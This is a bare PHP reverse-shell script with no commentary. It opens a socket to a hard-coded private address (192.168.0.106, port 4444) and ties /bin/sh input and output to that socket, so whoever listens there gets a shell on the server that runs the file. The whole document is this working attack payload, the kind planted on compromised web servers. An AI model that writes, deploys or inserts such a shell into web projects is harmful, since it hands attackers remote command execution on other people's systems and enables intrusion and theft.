<?php
$ip = '192.168.0.106';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(
    0 => $sock, // STDIN
    1 => $sock, // STDOUT
    2 => $sock  // STDERR
), $pipes);
?>
